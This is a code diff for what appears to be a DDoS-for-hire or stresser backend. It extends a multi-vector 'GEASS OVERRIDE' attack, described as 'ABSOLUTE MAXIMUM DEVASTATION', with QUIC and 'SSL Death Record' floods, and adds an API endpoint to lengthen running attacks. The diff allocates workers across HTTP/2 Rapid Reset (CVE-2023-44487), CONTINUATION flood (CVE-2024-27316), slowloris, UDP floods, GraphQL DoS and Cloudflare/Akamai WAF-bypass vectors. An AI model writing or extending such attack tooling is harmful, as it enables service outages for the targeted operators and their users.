@@ -170,45 +170,49 @@ async function runAttackWorkers(
   }
 
   // UDP attacks: SINGLE worker with multiple sockets (multi-worker UDP deadlocks in this env)
-  // numSockets inside the worker = min(threads, 8), so pass full thread count to 1 worker
-  const UDP_METHODS = new Set(["udp-flood", "udp-bypass"]);
+  // quic-flood is also UDP-based (sends to port 443/UDP)
+  const UDP_METHODS = new Set(["udp-flood", "udp-bypass", "quic-flood"]);
   if (UDP_METHODS.has(method)) {
     await spawnPool(method, target, port, threads, 1, signal, onStats);
     return;
   }
 
-  // ── GEASS OVERRIDE: OCTA vector — ABSOLUTE MAXIMUM DEVASTATION ──────────
-  // Vector 1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
-  // Vector 2: Slowloris               — hold half-open TLS sockets, starve thread pool
-  // Vector 3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU killer
-  // Vector 4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM
-  // Vector 5: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
-  // Vector 6: WebSocket Exhaustion    — goroutine/thread per conn, far more expensive than HTTP
-  // Vector 7: GraphQL Introspection   — exponential resolver CPU: O(N^15) complexity
-  // Vector 8: UDP Flood               — raw bandwidth saturation at L4
+  // ── GEASS OVERRIDE: DECA vector — ABSOLUTE MAXIMUM DEVASTATION ─────────
+  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
+  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
+  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU
+  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM
+  // Vector  5: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
+  // Vector  6: WebSocket Exhaustion    — goroutine/thread per conn, far more expensive than HTTP
+  // Vector  7: GraphQL Introspection   — exponential resolver CPU: O(N^15) complexity
+  // Vector  8: UDP Flood               — raw bandwidth saturation at L4
+  // Vector  9: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
+  // Vector 10: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
   //
-  // Total workers: 10 — optimized for 8vCPU / 32GB RAM deployment
+  // Total workers: 12 — optimized for 8vCPU / 32GB RAM deployment
   if (method === "geass-override") {
-    // Worker pool allocation — each vector gets dedicated workers
-    const connW  = 1;                                         // TLS socket exhaustion (FD-dense)
-    const slowW  = 1;                                         // half-open sockets
-    const h2W    = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487 sessions
-    const contW  = Math.max(1, Math.ceil(CPU_COUNT * 0.15)); // ≥1 — CVE-2024-27316 CONTINUATION
+    const connW  = 1;
+    const slowW  = 1;
+    const h2W    = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487
+    const contW  = Math.max(1, Math.ceil(CPU_COUNT * 0.15)); // ≥1 — CVE-2024-27316
     const wafW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // ≥2 — CF/Akamai bypass
-    const wsW    = 1;                                         // WebSocket goroutine exhaustion
-    const gqlW   = 1;                                         // GraphQL resolver CPU drain
+    const wsW    = 1;
+    const gqlW   = 1;
+    const quicW  = 1;  // QUIC/H3 — UDP single worker
+    const sslW   = 1;  // SSL Death Record
 
-    // Thread budget per vector — 8vCPU/32GB optimized
-    const connT  = Math.max(50,  Math.round(threads * 0.15));
-    const slowT  = Math.max(40,  Math.round(threads * 0.12));
-    const h2T    = Math.max(120, Math.round(threads * 0.30)); // ★ CVE-2023-44487 dominant
-    const contT  = Math.max(80,  Math.round(threads * 0.20)); // ★ CVE-2024-27316 OOM vector
-    const wafT   = Math.max(100, Math.round(threads * 0.25)); // ★ CF bypass sessions
-    const wsT    = Math.max(60,  Math.round(threads * 0.15)); // WebSocket hold
-    const gqlT   = Math.max(40,  Math.round(threads * 0.10)); // GraphQL CPU
+    // Thread budget — 8vCPU/32GB optimized (10-vector split)
+    const connT  = Math.max(50,  Math.round(threads * 0.12));
+    const slowT  = Math.max(40,  Math.round(threads * 0.10));
+    const h2T    = Math.max(120, Math.round(threads * 0.25)); // ★ CVE-2023-44487 dominant
+    const contT  = Math.max(80,  Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM
+    const wafT   = Math.max(100, Math.round(threads * 0.20)); // ★ CF bypass
+    const wsT    = Math.max(60,  Math.round(threads * 0.12)); // WS goroutine hold
+    const gqlT   = Math.max(40,  Math.round(threads * 0.08)); // GraphQL CPU
     const udpT   = Math.max(32,  Math.round(threads * 0.08)); // L4 bandwidth
+    const quicT  = Math.max(16,  Math.round(threads * 0.06)); // QUIC/H3 DCID exhaust
+    const sslT   = Math.max(50,  Math.round(threads * 0.10)); // SSL Death Record
 
-    // Track conns from conn+slow+ws pools, sum and forward
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
       if (c !== undefined) {
@@ -223,12 +227,14 @@ async function runAttackWorkers(
     await Promise.all([
       spawnPool("conn-flood",         target, port, connT, connW, signal, makeGeassOnStats("conn")),
       spawnPool("slowloris",          target, port, slowT, slowW, signal, makeGeassOnStats("slow")),
-      spawnPool("http2-flood",        target, port, h2T,   h2W,   signal, onStats),   // CVE-2023-44487
-      spawnPool("http2-continuation", target, port, contT, contW, signal, onStats),   // CVE-2024-27316
-      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),   // CF/Akamai evasion
-      spawnPool("ws-flood",           target, port, wsT,   wsW,   signal, makeGeassOnStats("ws")), // WS goroutine exhaust
-      spawnPool("graphql-dos",        target, port, gqlT,  gqlW,  signal, onStats),   // GraphQL CPU
-      spawnPool("udp-flood",          target, port, udpT,  1,     signal, onStats),   // L4 bandwidth
+      spawnPool("http2-flood",        target, port, h2T,   h2W,   signal, onStats),
+      spawnPool("http2-continuation", target, port, contT, contW, signal, onStats),
+      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),
+      spawnPool("ws-flood",           target, port, wsT,   wsW,   signal, makeGeassOnStats("ws")),
+      spawnPool("graphql-dos",        target, port, gqlT,  gqlW,  signal, onStats),
+      spawnPool("udp-flood",          target, port, udpT,  1,     signal, onStats),
+      spawnPool("quic-flood",         target, port, quicT, quicW, signal, onStats),
+      spawnPool("ssl-death",          target, port, sslT,  sslW,  signal, makeGeassOnStats("ssl")),
     ]);
     return;
   }
@@ -258,12 +264,9 @@ router.post("/attacks", async (req, res): Promise<void> => {
   const ctrl = new AbortController();
   const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);
 
-  // Store workers for manual stop
-  void (async () => {
-    // We need to intercept spawned workers for stop support
-    // Patch: store active AbortController by id
-    attackAborts.set(id, ctrl);
-  })();
+  // Store for manual stop + extend support
+  attackAborts.set(id, ctrl);
+  attackTimers.set(id, stopTimer);
 
   void runAttackWorkers(method, target, port, threads, ctrl.signal,
     (pkts, bytes, conns) => {
@@ -272,7 +275,9 @@ router.post("/attacks", async (req, res): Promise<void> => {
     }
   ).finally(async () => {
     attackLiveConns.delete(id);
-    clearTimeout(stopTimer);
+    const t = attackTimers.get(id);
+    if (t) clearTimeout(t);
+    attackTimers.delete(id);
     attackAborts.delete(id);
     try {
       const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
@@ -288,8 +293,9 @@ router.post("/attacks", async (req, res): Promise<void> => {
   res.status(201).json(attack);
 });
 
-// Map for abort controllers
-const attackAborts = new Map<number, AbortController>();
+// Map for abort controllers + stop timers (for Extend support)
+const attackAborts  = new Map<number, AbortController>();
+const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();
 
 router.get("/attacks/stats", async (_req, res): Promise<void> => {
   const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
@@ -327,6 +333,27 @@ router.delete("/attacks/:id", async (req, res): Promise<void> => {
   const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
   if (!a) { res.status(404).json({ error: "Not found" }); return; }
   res.sendStatus(204);
+});
+
+// ── Extend running attack by +60s ────────────────────────────────────────
+router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
+  const id = parseInt(req.params.id, 10);
+  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
+  const ctrl = attackAborts.get(id);
+  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
+  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;
+
+  // Clear old stop timer, arm new one
+  const old = attackTimers.get(id);
+  if (old) clearTimeout(old);
+  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), addSec * 1000);
+  attackTimers.set(id, newTimer);
+
+  const [a] = await db.update(attacksTable)
+    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
+    .where(eq(attacksTable.id, id)).returning();
+  if (!a) { res.status(404).json({ error: "Not found" }); return; }
+  res.json({ ok: true, extended: addSec, ...a });
 });
 
 router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
